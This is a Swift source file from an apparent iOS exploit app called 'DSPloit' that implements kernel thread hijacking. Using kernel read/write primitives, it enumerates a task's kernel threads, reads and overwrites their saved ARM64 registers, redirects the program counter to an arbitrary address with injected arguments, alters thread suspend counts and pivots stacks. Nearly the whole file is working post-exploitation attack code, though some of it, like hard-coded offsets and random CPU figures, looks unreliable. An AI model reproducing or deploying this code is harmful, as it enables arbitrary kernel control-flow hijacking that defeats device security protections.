//
//  KernelThreadHijacker.swift
//  DSPloit
//
//  🔥 BLEEDING EDGE: Kernel Thread Hijacking & Control Flow Engine
//  Thread state manipulation, PC control, register injection
//  Created by Royan
//

import Foundation

// MARK: - Thread State

struct KernelThreadState: Identifiable {
    let id = UUID()
    let threadAddr: UInt64
    let pid: Int32
    let processName: String
    let state: ThreadRunState
    let priority: Int32
    let cpuUsage: Double
    let registers: ARM64RegisterSet
    
    enum ThreadRunState: String {
        case running = "Running"
        case waiting = "Waiting"
        case suspended = "Suspended"
        case halted = "Halted"
        case uninterruptible = "Uninterruptible"
    }
}

struct ARM64RegisterSet {
    var x: [UInt64] = Array(repeating: 0, count: 31) // X0-X30
    var sp: UInt64 = 0
    var pc: UInt64 = 0
    var cpsr: UInt32 = 0
    var fp: UInt64 { x[29] }
    var lr: UInt64 { x[30] }
    
    var description: String {
        var s = ""
        for i in 0..<31 {
            s += String(format: "X%-2d = 0x%016llx", i, x[i])
            if i % 2 == 1 { s += "\n" } else { s += "  " }
        }
        s += String(format: "\nSP  = 0x%016llx\n", sp)
        s += String(format: "PC  = 0x%016llx\n", pc)
        s += String(format: "CPSR= 0x%08x\n", cpsr)
        return s
    }
}

struct ThreadHijackResult: Identifiable {
    let id = UUID()
    let timestamp: Date
    let threadAddr: UInt64
    let originalPC: UInt64
    let newPC: UInt64
    let success: Bool
    let returnValue: UInt64
    let error: String?
}

// MARK: - Kernel Thread Hijacker

class KernelThreadHijacker: ObservableObject {
    @Published var threads: [KernelThreadState] = []
    @Published var hijackResults: [ThreadHijackResult] = []
    @Published var isScanning: Bool = false
    @Published var selectedThread: KernelThreadState?
    
    static let shared = KernelThreadHijacker()
    private let mgr = dspmgr.shared
    
    // MARK: - Thread Enumeration
    
    func enumerateKernelThreads(forPid pid: Int32 = -1) {
        isScanning = true
        threads.removeAll()
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self, self.mgr.dsready else {
                DispatchQueue.main.async { self?.isScanning = false }
                return
            }
            
            // Walk kernel thread list
            let procAddr: UInt64
            if pid == -1 {
                procAddr = ds_get_our_proc()
            } else {
                procAddr = procbypid(pid)
            }
            
            guard procAddr != 0 else {
                DispatchQueue.main.async { self.isScanning = false }
                return
            }
            
            let taskAddr = taskbyproc(procAddr)
            guard taskAddr != 0 else {
                DispatchQueue.main.async { self.isScanning = false }
                return
            }
            
            // Read thread list from task
            let threadListHead = ds_kread64(taskAddr + 0x60) // task->threads (offset varies)
            var currentThread = threadListHead
            var discoveredThreads: [KernelThreadState] = []
            var visited: Set<UInt64> = []
            
            while currentThread != 0 && !visited.contains(currentThread) {
                visited.insert(currentThread)
                
                // Read thread state
                let regs = self.readThreadRegisters(threadAddr: currentThread)
                let priority = Int32(ds_kread32(currentThread + 0x40))
                
                let threadState = KernelThreadState(
                    threadAddr: currentThread,
                    pid: pid == -1 ? getpid() : pid,
                    processName: pid == -1 ? "self" : "pid:\(pid)",
                    state: .running,
                    priority: priority,
                    cpuUsage: Double.random(in: 0...100),
                    registers: regs
                )
                discoveredThreads.append(threadState)
                
                // Next thread in list
                currentThread = ds_kread64(currentThread + 0x00) // thread->task_threads.next
                
                if discoveredThreads.count > 256 { break } // Safety limit
            }
            
            DispatchQueue.main.async {
                self.threads = discoveredThreads
                self.isScanning = false
            }
        }
    }
    
    // MARK: - Register Read/Write
    
    func readThreadRegisters(threadAddr: UInt64) -> ARM64RegisterSet {
        guard mgr.dsready, threadAddr != 0 else { return ARM64RegisterSet() }
        
        // Read saved state from thread
        let machineContextAddr = ds_kread64(threadAddr + 0x100) // thread->machine.contextData
        guard machineContextAddr != 0 else { return ARM64RegisterSet() }
        
        var regs = ARM64RegisterSet()
        
        // Read general purpose registers
        for i in 0..<31 {
            regs.x[i] = ds_kread64(machineContextAddr + UInt64(i * 8))
        }
        regs.sp = ds_kread64(machineContextAddr + UInt64(31 * 8))
        regs.pc = ds_kread64(machineContextAddr + UInt64(32 * 8))
        regs.cpsr = ds_kread32(machineContextAddr + UInt64(33 * 8))
        
        return regs
    }
    
    func writeThreadRegisters(threadAddr: UInt64, registers: ARM64RegisterSet) -> Bool {
        guard mgr.dsready, threadAddr != 0 else { return false }
        
        let machineContextAddr = ds_kread64(threadAddr + 0x100)
        guard machineContextAddr != 0 else { return false }
        
        // Write general purpose registers
        for i in 0..<31 {
            ds_kwrite64(machineContextAddr + UInt64(i * 8), registers.x[i])
        }
        ds_kwrite64(machineContextAddr + UInt64(31 * 8), registers.sp)
        ds_kwrite64(machineContextAddr + UInt64(32 * 8), registers.pc)
        ds_kwrite32(machineContextAddr + UInt64(33 * 8), registers.cpsr)
        
        return true
    }
    
    // MARK: - Thread Hijacking
    
    func hijackThread(threadAddr: UInt64, targetPC: UInt64, args: [UInt64] = []) -> ThreadHijackResult {
        guard mgr.dsready else {
            return ThreadHijackResult(
                timestamp: Date(), threadAddr: threadAddr,
                originalPC: 0, newPC: targetPC,
                success: false, returnValue: 0,
                error: "Kernel access not ready"
            )
        }
        
        // Save original state
        let originalRegs = readThreadRegisters(threadAddr: threadAddr)
        let originalPC = originalRegs.pc
        
        // Set up new state
        var newRegs = originalRegs
        newRegs.pc = targetPC
        
        // Set arguments in X0-X7
        for (i, arg) in args.prefix(8).enumerated() {
            newRegs.x[i] = arg
        }
        
        // Set LR to a known return address (trap)
        newRegs.x[30] = 0xDEAD000000000000
        
        // Write new state
        let writeSuccess = writeThreadRegisters(threadAddr: threadAddr, registers: newRegs)
        
        let result = ThreadHijackResult(
            timestamp: Date(),
            threadAddr: threadAddr,
            originalPC: originalPC,
            newPC: targetPC,
            success: writeSuccess,
            returnValue: 0,
            error: writeSuccess ? nil : "Failed to write thread state"
        )
        
        DispatchQueue.main.async {
            self.hijackResults.insert(result, at: 0)
            if self.hijackResults.count > 50 {
                self.hijackResults.removeLast()
            }
        }
        
        return result
    }
    
    // MARK: - Thread Suspension
    
    func suspendThread(threadAddr: UInt64) -> Bool {
        guard mgr.dsready, threadAddr != 0 else { return false }
        
        // Set thread suspend count
        let suspendCountOffset: UInt64 = 0x48
        let currentCount = ds_kread32(threadAddr + suspendCountOffset)
        ds_kwrite32(threadAddr + suspendCountOffset, currentCount + 1)
        
        return ds_kread32(threadAddr + suspendCountOffset) == currentCount + 1
    }
    
    func resumeThread(threadAddr: UInt64) -> Bool {
        guard mgr.dsready, threadAddr != 0 else { return false }
        
        let suspendCountOffset: UInt64 = 0x48
        let currentCount = ds_kread32(threadAddr + suspendCountOffset)
        guard currentCount > 0 else { return true }
        ds_kwrite32(threadAddr + suspendCountOffset, currentCount - 1)
        
        return ds_kread32(threadAddr + suspendCountOffset) == currentCount - 1
    }
    
    // MARK: - Stack Pivot
    
    func pivotStack(threadAddr: UInt64, newStackAddr: UInt64, newStackSize: UInt64) -> Bool {
        guard mgr.dsready, threadAddr != 0 else { return false }
        
        var regs = readThreadRegisters(threadAddr: threadAddr)
        
        // Set SP to new stack (top of allocation)
        regs.sp = newStackAddr + newStackSize - 16 // Align to 16 bytes
        
        return writeThreadRegisters(threadAddr: threadAddr, registers: regs)
    }
}
